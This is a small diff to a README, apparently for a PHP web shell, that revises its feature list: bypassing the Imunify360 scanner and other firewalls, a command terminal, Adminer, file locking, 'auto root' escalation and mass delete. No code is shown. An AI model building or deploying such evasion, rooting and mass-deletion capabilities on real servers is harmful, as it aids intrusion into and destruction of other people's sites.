@@ -5,11 +5,12 @@
 Mungkin Pertengahan Bulan Mei (May) :v
 
 # FEATURES
+- Responsive
 - Bypass Imunify360 Tested In Version 6.12.4-1
 - Bypass Blank Shell
-- Bypass 403 Forbidden
-- Adminer
-- Command Shell
+- Bypass Other Firewall
+- Adminer (PHP Adminer)
+- Command Shell (Terminal)
 - Lock File
 - Auto Root
 - Mass Delete
